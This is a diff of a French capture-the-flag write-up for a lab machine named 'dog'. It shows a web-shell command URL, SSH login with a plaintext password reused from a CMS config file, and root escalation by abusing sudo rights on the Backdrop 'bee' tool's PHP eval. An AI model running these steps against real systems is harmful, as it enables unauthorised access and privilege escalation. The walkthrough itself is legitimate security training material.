@@ -233,39 +233,77 @@ http://10.10.11.58/modules/shell/shell.php?cmd=whoami
 ◇ Tape la commande :
 ![commande](/static/images/dog/commande.png)
 
-◇ Récupère la liste des utilisateurs -> johncusack
+◇ Récupère la liste des utilisateurs -> **johncusack**
 ![passwd](/static/images/dog/passwd.png)
 
 ## 🔑 6. Accès utilisateur via SSH
 
-◇ Dans settings.php, identifiants MySQL sont utilisés aussi par un utilisateur système.
-
-◇ Teste l’accès SSH avec johncusack:BackDropJ2024DS2024.
+◇ Teste l’accès SSH avec johncusack:BackDropJ2024DS2024 -> **fonctionne**
 
 ```
-ssh johncusack@10.10.11.5
+ssh johncusack@10.10.11.58
 ```
 
-◇ ✅ Récupération de user.txt.
+◇ ✅ Récupération du flag **user.txt**
+
+```
+johncusack@dog:~$ ls
+user.txt
+```
 
 ## 🚀 7. Escalade de privilèges
 
-◇ Vérifie les droits sudo :
+◇ **Vérifie les droits sudo :**
 
 ```
-sudo -l
+johncusack@dog:~$ sudo -l
+[sudo] password for johncusack:
+Matching Defaults entries for johncusack on dog:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User johncusack may run the following commands on dog:
+    (ALL : ALL) /usr/local/bin/bee
 ```
 
-◇ Résultat : peut exécuter /usr/local/bin/bee en tant que root.
+◇ Résultat : peut exécuter /usr/local/bin/bee en tant que **root**.
 
-◇ bee permet d’exécuter du code PHP → donc exécuter des commandes système.
+◇ **bee** est l'utilitaire en ligne de commande pour BackDrop CMS et a besoin de connaître l’endroit précis où Backdrop CMS est installé pour fonctionner correctement.
 
 ```
-sudo /usr/local/bin/bee ev "system('id')"
-sudo /usr/local/bin/bee ev "system('cat /root/root.txt')"
+johncusack@dog:~$ bee -help
+🐝 Bee
+Usage: bee [global-options] <command> [options] [arguments]
+
+Global Options:
+ --root
+ Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.
+
+...
+eval
+   ev, php-eval
+   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
+
 ```
 
-◇ ✅ Récupération du flag root.txt
+- "eval" -> argument qui demande à bee d'évaluer ce qui suit.
+- "--root" -> option qui sert à spécifier le répertoire racine du CMS (là où Backdrop est installé). -> **/var/www/html**
+
+◇ bee permet d’exécuter du code PHP → donc **exécuter des commandes système**.
+
+"system('id')" : Code PHP injecté pour exécuter la commande système id, qui affiche l'identité de l'utilisateur courant du système.
+
+```
+johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "system('id')"
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+```
+johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "system('ls /root/')"
+root.txt
+```
+
+◇ ✅ Récupération du **flag root.txt**
 
 ---
 
